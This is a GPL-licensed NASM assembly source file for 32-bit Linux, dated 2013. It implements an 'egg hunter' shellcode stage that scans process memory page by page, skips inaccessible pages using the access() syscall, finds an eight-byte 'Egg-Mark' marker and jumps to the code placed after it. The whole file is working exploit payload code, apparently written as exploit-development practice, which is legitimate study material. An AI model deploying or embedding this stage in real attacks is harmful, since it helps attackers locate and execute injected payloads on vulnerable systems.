;    This program is free software: you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation, either version 3 of the License, or
;    (at your option) any later version.
;
;    This program is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
;
; Filename: hunter.nasm *access +noloop modification
; Author: Andrey Arapov <andrey.arapov@gmail.com>
; 2013 March
;
;

section .data
	egg1	equ "Egg-"	; DWORD Egg marker part1
	egg2	equ "Mark"	; DWORD Egg marker part2


section .text
global _start


_start:
        ; function Prologue
        push ebp
        mov ebp, esp

	; preserve registers and flags 	
	pushad
	pushfd


	; Used for cmp edx, esi below
	push 0xfffefff
	pop esi
	inc esi

	xor edx, edx	; Searching the whole memory


	; We will scan memory page-by-page and only accessible pages will be scanned for the Egg marker
nextPage:
;	cmp edx, 0xffff000
	cmp edx, esi	; We don't want NULL bytes
	jz Return	; Egg Hunter will go for retirement (i.e. we simply prevent forever-loop in case if there is no Egg)

	or dx, 0xfff	; The same as "add dx, 4095" (PAGE_SIZE)

nextAddr:
	inc edx		; Searching forward

	; Checking if memory is accessible
	push byte +0x21		; 0x21 = 33 = __NR_access
	pop eax			; EAX points to 0x21
	lea ebx, [edx+0x8]	; next address to check
	xor ecx, ecx		; 0: mode = F_OK
	int 0x80
	cmp al, -14		; -14 = EFAULT = Bad address.  See /usr/include/asm-generic/errno-base.h
	jz nextPage


        ; Searching for the Egg marker (in current page of memory which is accessible)
	cmp dword [edx], egg1
	jne nextAddr
	cmp dword [edx+0x4], egg2
	jne nextAddr

	lea ecx, [edx+0x8]
	jmp ecx

Return:
	; restore registers and stack 
	popfd
	popad

        ; function Epilogue
        mov esp, ebp
        pop ebp

	ret
